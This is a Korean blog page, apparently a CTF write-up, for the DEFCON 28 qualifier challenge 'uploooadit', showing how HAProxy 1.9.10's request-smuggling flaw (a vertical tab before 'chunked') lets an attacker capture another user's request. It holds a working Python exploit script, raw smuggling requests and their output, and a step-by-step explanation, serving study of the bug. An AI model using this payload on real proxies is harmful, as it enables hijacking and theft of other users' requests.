@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    <title>DEFCON28 - uploooadit | kimtruth&#39;s Blog</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="defcon">
+    
+    <meta name="description" content="문제 정보 https://uploooadit.oooverflow.io/ Files:  app.py 358c19d6478e1f66a25161933566d7111dd293f02d9916a89c56e09268c2b54c store.py dd5cee877ee73966c53f0577dc85be1705f2a13f12eb58a56a500f1da9dc49c0   문제 분">
+<meta name="keywords" content="defcon">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEFCON28 - uploooadit">
+<meta property="og:url" content="https://kimtruth.github.io/2020/05/24/defcon-28-uploooadit/index.html">
+<meta property="og:site_name" content="kimtruth&#39;s Blog">
+<meta property="og:description" content="문제 정보 https://uploooadit.oooverflow.io/ Files:  app.py 358c19d6478e1f66a25161933566d7111dd293f02d9916a89c56e09268c2b54c store.py dd5cee877ee73966c53f0577dc85be1705f2a13f12eb58a56a500f1da9dc49c0   문제 분">
+<meta property="og:locale" content="kr">
+<meta property="og:image" content="https://kimtruth.github.io/2020/05/24/defcon-28-uploooadit/1.png">
+<meta property="og:updated_time" content="2020-05-24T12:45:39.083Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DEFCON28 - uploooadit">
+<meta name="twitter:description" content="문제 정보 https://uploooadit.oooverflow.io/ Files:  app.py 358c19d6478e1f66a25161933566d7111dd293f02d9916a89c56e09268c2b54c store.py dd5cee877ee73966c53f0577dc85be1705f2a13f12eb58a56a500f1da9dc49c0   문제 분">
+<meta name="twitter:image" content="https://kimtruth.github.io/2020/05/24/defcon-28-uploooadit/1.png">
+<meta property="fb:admins" content="1984693938443783">
+<meta property="fb:app_id" content="1984693938443783">
+    
+
+    
+
+    
+        <link rel="icon" href="/images/favicon.ico">
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.0.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-88959679-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+
+
+<link rel="alternate" href="/rss2.xml" title="kimtruth's Blog" type="application/rss+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+</html>
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+            <!--
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+            -->
+            <div id="header-title" style="text-align:left">
+                <h1>
+                    <a href="/" style="font-size:40px;color:#fff; font-weight:bold; font-style: italic;text-decoration: none;">kimtruth's Blog</a>
+                </h1>
+            </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Inici</a>
+                                </li>
+                            
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/">Development</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/Algorithm/">Algorithm</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/iOS/">iOS</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/">Hacking</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Crpto/">Crpto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Forensic/">Forensic</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Network/">Network</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Pwnable/">Pwnable</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Reversing/">Reversing</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Web/">Web</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Question/">Question</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Story/">Story</a></li></ul>
+                                    
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="https://www.rocketpunch.com/@kimtruth">Quant a</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Cercar" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'categories',
+            TAGS: 'etiquetes',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/Hacking/Web/">Web</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-defcon-28-uploooadit" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        DEFCON28 - uploooadit
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2020/05/24/defcon-28-uploooadit/" class="article-date">
+            <time datetime="2020-05-24T08:27:34.000Z" itemprop="datePublished">2020-05-24</time>
+        </a>
+    </div>
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/defcon/">defcon</a>
+    </div>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <h2 id="문제-정보"><a href="#문제-정보" class="headerlink" title="문제 정보"></a>문제 정보</h2><p><img src="/2020/05/24/defcon-28-uploooadit/1.png" width="50%"></p>
+<p><a href="https://uploooadit.oooverflow.io/" target="_blank" rel="noopener">https://uploooadit.oooverflow.io/</a></p>
+<p>Files:</p>
+<ul>
+<li><a href="/2020/05/24/defcon-28-uploooadit/app.py" title="app.py">app.py</a> 358c19d6478e1f66a25161933566d7111dd293f02d9916a89c56e09268c2b54c</li>
+<li><a href="/2020/05/24/defcon-28-uploooadit/store.py" title="store.py">store.py</a> dd5cee877ee73966c53f0577dc85be1705f2a13f12eb58a56a500f1da9dc49c0</li>
+</ul>
+<hr>
+<h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><figure class="highlight python"><figcaption><span>app.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/files/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">"Content-Type"</span>) != <span class="string">"text/plain"</span>:</span><br><span class="line">        abort(<span class="number">422</span>)</span><br><span class="line"></span><br><span class="line">    guid = request.headers.get(<span class="string">"X-guid"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> GUID_RE.match(guid):</span><br><span class="line">        abort(<span class="number">422</span>)</span><br><span class="line"></span><br><span class="line">    filestore.save(guid, request.data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>, <span class="number">201</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/files/&lt;guid&gt;", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(guid)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> GUID_RE.match(guid):</span><br><span class="line">        abort(<span class="number">422</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> filestore.read(guid), &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;</span><br><span class="line">    <span class="keyword">except</span> store.NotFound:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>, <span class="number">204</span></span><br></pre></td></tr></table></figure>
+<p>우선 제공해주는 API를 정리하면 두 가지 입니다.</p>
+<ol>
+<li><code>POST</code>로 <code>/files/</code>에 <code>X-guid</code>헤더와 함께 데이터를 보내면 저장이 된다.</li>
+<li><code>GET</code>으로 <code>/files/{guid}</code>를 요청하면 저장했던 데이터를 읽어올 수 있다.</li>
+</ol>
+<p><code>curl</code>로 한번 요청을 날려보았더니 <code>haproxy</code>라는 것을 사용하는 것을 볼 수 있었습니다.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">defcon2020 ❯ curl -I -X POST https://uploooadit.oooverflow.io/files/</span><br><span class="line">HTTP/1.1 422 UNPROCESSABLE ENTITY</span><br><span class="line">Server: gunicorn/20.0.0</span><br><span class="line">Date: Sun, 24 May 2020 09:05:02 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 215</span><br><span class="line">Via: haproxy</span><br><span class="line">X-Served-By: ip-10-0-1-98.us-east-2.compute.internal</span><br></pre></td></tr></table></figure>
+<p><a href="http://www.haproxy.org/" target="_blank" rel="noopener">HAProxy</a>는 L4, L7 스위치에서 제공하는 기능과 로드밸런싱 기능을 제공해주는 소프트웨어입니다.<br>하지만, HAProxy는 얼마전에 <code>HTTP request smuggling</code> 취약점(<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-18277" target="_blank" rel="noopener">CVE-2019-18277</a>)이 발견되었던적이 있습니다.<br>위 HTTP 요청 결과에는 HAProxy 버전이 나와있지 않아, 취약했던 버전에 이용됐던 공격을 이용해보기로 했습니다.</p>
+<h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><p><code>chunked</code>앞에 <code>\x0b (vertical tab)</code>문자 삽입<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding:</span><br><span class="line"> chunked</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure></p>
+<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 400 Bad request</span><br><span class="line">Server: haproxy 1.9.10</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;</span><br><span class="line">Your browser sent an invalid request.</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><code>haproxy 1.9.10</code>버전을 보니 <code>HTTP request smuggling attack</code>에 취약한 버전이고, <code>400</code>이 뜬걸 보니 공격에 성공한것으로 보입니다.</p>
+<p>이 공격기법을 이용하면, 임의의 request를 가로챌 수 있으므로 위의 데이터 저장 API를 이용하여 임의의 유저의 request를 저장할 수 있습니다.</p>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'uploooadit.oooverflow.io'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(data)</span>:</span></span><br><span class="line">    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s_sock = context.wrap_socket(s, server_hostname=HOST)</span><br><span class="line">    s_sock.connect((HOST, <span class="number">443</span>))</span><br><span class="line">    s_sock.send(data)</span><br><span class="line"></span><br><span class="line">    data = s_sock.recv(<span class="number">102400</span>)</span><br><span class="line">    s_sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">guid = str(uuid.uuid4()).encode()</span><br><span class="line"></span><br><span class="line">second_packet  = <span class="string">b'POST /files/ HTTP/1.1\r\n'</span></span><br><span class="line">second_packet += <span class="string">b'Host: localhost:7979\r\n'</span></span><br><span class="line">second_packet += <span class="string">b'Content-Type: text/plain\r\n'</span></span><br><span class="line">second_packet += <span class="string">b'Content-Length: 386\r\n'</span></span><br><span class="line">second_packet += <span class="string">b'X-guid:'</span> + guid + <span class="string">b'\r\n\r\n'</span></span><br><span class="line">second_packet += <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">first_packet  = <span class="string">b'GET / HTTP/1.1\r\n'</span></span><br><span class="line">first_packet += <span class="string">b'Content-Length:'</span> + str(len(second_packet)+<span class="number">11</span>).encode() + <span class="string">b'\r\n'</span></span><br><span class="line">first_packet += <span class="string">b'Transfer-Encoding: \x0bchunked\r\n\r\n'</span></span><br><span class="line">first_packet += <span class="string">b'1\r\n'</span></span><br><span class="line">first_packet += <span class="string">b'A\r\n'</span></span><br><span class="line">first_packet += <span class="string">b'0\r\n\r\n'</span></span><br><span class="line"></span><br><span class="line">smuggle_packet = first_packet + second_packet</span><br><span class="line"></span><br><span class="line">data = send_payload(smuggle_packet)</span><br><span class="line">print(<span class="string">'-------REQUEST [1]---------'</span>)</span><br><span class="line">print(smuggle_packet.decode())</span><br><span class="line">print(<span class="string">'-------RESPONSE [1]---------'</span>)</span><br><span class="line">print(data.decode())</span><br><span class="line">print(<span class="string">"-------Victim's Request---------"</span>)</span><br><span class="line">print(requests.get(<span class="string">b'https://uploooadit.oooverflow.io/files/'</span> + guid).text)</span><br></pre></td></tr></table></figure>
+<h2 id="output"><a href="#output" class="headerlink" title="output"></a>output</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">defcon2020 ❯ python3 attack.py</span><br><span class="line">-------REQUEST [1]---------</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Content-Length:150</span><br><span class="line">Transfer-Encoding:</span><br><span class="line">                   chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /files/ HTTP/1.1</span><br><span class="line">Host: localhost:7979</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 386</span><br><span class="line">X-guid:59aad79f-08d0-4c6a-bde5-d252312d0c4a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------RESPONSE [1]---------</span><br><span class="line">HTTP/1.1 204 NO CONTENT</span><br><span class="line">Server: gunicorn/20.0.0</span><br><span class="line">Date: Sun, 24 May 2020 09:54:15 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Via: haproxy</span><br><span class="line">X-Served-By: ip-10-0-1-98.us-east-2.compute.internal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------Victim&apos;s Request---------</span><br><span class="line">POST /files/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: invoker</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">X-guid: 4aaccd09-cbb0-49a5-97ed-f4d423205709</span><br><span class="line">Content-Length: 152</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">Congratulations!</span><br><span class="line">OOO&#123;That girl thinks she&apos;s the queen of the neighborhood/She&apos;s got the hottest trike in town/That girl, she holds her head up so high&#125;</span><br></pre></td></tr></table></figure>
+<p><code>HTTP request smuggling attack</code>자체가 임의의 유저의 reqeust를 제어할 수 있게 되는 취약점이다 보니, 어떤식으로 <code>flag</code>를 얻을 수 있게 CTF에서 문제를 낼까 싶었는데 문제 출제진 측에서 주기적으로 <code>flag</code>가 포함된 요청을 보내고 있었습니다.</p>
+<h2 id="Exploit-분석"><a href="#Exploit-분석" class="headerlink" title="Exploit 분석"></a>Exploit 분석</h2><p>이번기회에 저 공격이 왜 되는지 정리해보자면…</p>
+<p>위 공격은 HAProxy (frontend)와 backend server가 HTTP request header를 서로 다르게 파싱하는것에서 문제가 발생합니다.<br>또한, <code>Content-Length</code>와 <code>Transfer-Encoding: chunked</code>가 동시에 존재할때, <code>Content-Length</code>헤더는 무시하게 됩니다.<br>하지만, HAProxy는 <code>Transfer-Encoding: [\x0b]chunked</code>를 <code>vertical tab</code>때문에, 파싱하지 못하지만, backend에서는 정상적으로 파싱을 하게 됩니다.</p>
+<p>그럼, 일단 하나하나 다같이 살펴보겠습니다.</p>
+<h2 id="1-Hacker-→-HAProxy"><a href="#1-Hacker-→-HAProxy" class="headerlink" title="1. Hacker → HAProxy"></a>1. Hacker → HAProxy</h2><p>HAProxy는 <code>chunked</code>앞에 <code>vertical tab</code>이 들어간 <code>Transfer-Encoding</code>를 인식하지 못하고 <code>Content-Length</code>를 파싱하여 request를 읽어들입니다.</p>
+<div style="background-color:#DAE8FC;font-size:14px;font-family:Consolas, Monaco, Menlo, Consolas, monospace;padding:10px">
+<pre>
+GET / HTTP/1.1
+<b>Content-Length:150</b>
+Transfer-Encoding: [\x0b]chunked
+
+1
+A
+0
+
+POST /files/ HTTP/1.1
+Host: localhost:7979
+Content-Type: text/plain
+Content-Length: 386
+X-guid:59aad79f-08d0-4c6a-bde5-d252312d0c4a
+</pre></div>
+
+<h2 id="2-HAProxy-→-Backend"><a href="#2-HAProxy-→-Backend" class="headerlink" title="2. HAProxy → Backend"></a>2. HAProxy → Backend</h2><p>HAProxy는 파싱하지 못했던 <code>Transfer-Encoding: [\x0b]chunked</code>까지 포함하여, 그대로 <code>Backend</code>로 전달합니다.<br>(HAProxy에서 새로운 header를 추가할 수 있겠지만, 이번 설명에서는 제외하겠습니다)</p>
+<div style="background-color:#DAE8FC;font-size:14px;font-family:Consolas, Monaco, Menlo, Consolas, monospace;padding:10px">
+<pre>
+GET / HTTP/1.1
+<b>Content-Length:150</b>
+Transfer-Encoding: [\x0b]chunked
+
+1
+A
+0
+
+POST /files/ HTTP/1.1
+Host: localhost:7979
+Content-Type: text/plain
+Content-Length: 386
+X-guid:59aad79f-08d0-4c6a-bde5-d252312d0c4a
+</pre></div>
+
+<h2 id="3-Backend에서의-파싱"><a href="#3-Backend에서의-파싱" class="headerlink" title="3. Backend에서의 파싱"></a>3. Backend에서의 파싱</h2><p>하지만 이걸 <code>Backend</code>에서는 <code>Transfer-Encoding</code>을 정상적으로 파싱하여 첫번째 파란색 요청만 처리합니다.</p>
+<div style="background-color:#DAE8FC;font-size:14px;font-family:Consolas, Monaco, Menlo, Consolas, monospace;padding:10px">
+<pre>
+GET / HTTP/1.1
+Content-Length:150
+<b>Transfer-Encoding: [\x0b]chunked</b>
+
+1
+A
+0
+</pre></div>
+
+<div style="background-color:#FFE6CC;font-size:14px;font-family:Consolas, Monaco, Menlo, Consolas, monospace;padding:10px">
+<pre>
+POST /files/ HTTP/1.1
+Host: localhost:7979
+Content-Type: text/plain
+Content-Length: 386
+X-guid:59aad79f-08d0-4c6a-bde5-d252312d0c4a
+
+</pre></div>
+
+<p>첫번째 파란색 요청에 대한 응답을 보냅니다.</p>
+<div style="background-color:#DAE8FC;font-size:14px;font-family:Consolas, Monaco, Menlo, Consolas, monospace;padding:10px">
+<pre>
+HTTP/1.1 204 NO CONTENT
+Server: gunicorn/20.0.0
+Date: Sun, 24 May 2020 09:54:15 GMT
+Content-Type: text/html; charset=utf-8
+Via: haproxy
+X-Served-By: ip-10-0-1-98.us-east-2.compute.internal
+</pre></div>
+
+<p>주황색 부분은 처리되지 않고 backend socket에 남아 이후 들어오는 요청 앞에 붙어 오염시키게 됩니다.</p>
+<h2 id="4-Victim-→-HAProxy-→-Backend"><a href="#4-Victim-→-HAProxy-→-Backend" class="headerlink" title="4. Victim → HAProxy → Backend"></a>4. Victim → HAProxy → Backend</h2><p>이때, Victim이 요청을 보내게 됩니다.</p>
+<div style="background-color:#D5E8D4;font-size:14px;font-family:Consolas, Monaco, Menlo, Consolas, monospace;padding:10px;overflow:scroll">
+<pre>
+POST /files/ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: invoker
+Accept-Encoding: gzip, deflate
+Accept: */*
+Content-Type: text/plain
+X-guid: 4aaccd09-cbb0-49a5-97ed-f4d423205709
+Content-Length: 152
+X-Forwarded-For: 127.0.0.1
+
+Congratulations!
+OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
+</pre></div>
+
+<p>하지만, 해당 요청은 Hacker가 오염시켜놓은 backend socket에 보내져 오염되게 되고, 해커가 의도한 두번째 http request가 완성되게 됩니다.</p>
+<div style="background-color:#E1D5E7;font-size:14px;font-family:Consolas, Monaco, Menlo, Consolas, monospace;padding:10px;overflow:scroll">
+<pre>
+POST /files/ HTTP/1.1
+Host: localhost:7979
+Content-Type: text/plain
+Content-Length: 386
+X-guid:59aad79f-08d0-4c6a-bde5-d252312d0c4a
+
+POST /files/ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: invoker
+Accept-Encoding: gzip, deflate
+Accept: */*
+Content-Type: text/plain
+X-guid: 4aaccd09-cbb0-49a5-97ed-f4d423205709
+Content-Length: 152
+X-Forwarded-For: 127.0.0.1
+
+Congratulations!
+OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
+</pre></div>
+
+<p>그리고 Victim은 이 보라색 request에 대한 response를 받게 됩니다.</p>
+<h2 id="5-공격성공-확인"><a href="#5-공격성공-확인" class="headerlink" title="5. 공격성공 확인"></a>5. 공격성공 확인</h2><p>Hacker는 <code>59aad79f-08d0-4c6a-bde5-d252312d0c4a</code>라는 <code>guid</code>로 Victim의 요청을 저장되게 요청을 구현했으므로, 잘 저장되어있는지 요청하여 확인하면 됩니다.</p>
+<hr>
+<p>이렇게, <code>HTTP request smuggling attack</code>을 이용하면 임의의 유저의 HTTP Request 앞 부분에 원하는 내용을 넣어 오염시킬 수 있습니다. 또한, response를 다르게 받을 수 있게도 가능하니 Reflected XSS 등, 여러가지 공격이 가능합니다.</p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="https://kimtruth.github.io/2020/05/24/defcon-28-uploooadit/" data-id="ckor8g4nk005shqwyd6rsaix7" class="article-share-link"><i class="fa fa-share"></i>Compartir</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>seguir:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="facebook" href="https://www.facebook.com/k1mtruth" target="_blank">
+                        <i class="icon fa fa-facebook"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/kimtruth/" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2020/06/07/pwnable-kr-md5-calculator/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">més nou</strong>
+        <p class="article-nav-title">
+        
+            pwnable.kr - md5 calculator
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2020/04/26/How-hackers-enjoy-playing-maplestory/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">antic</strong>
+        <p class="article-nav-title">메이플스토리 가지고 놀기</p>
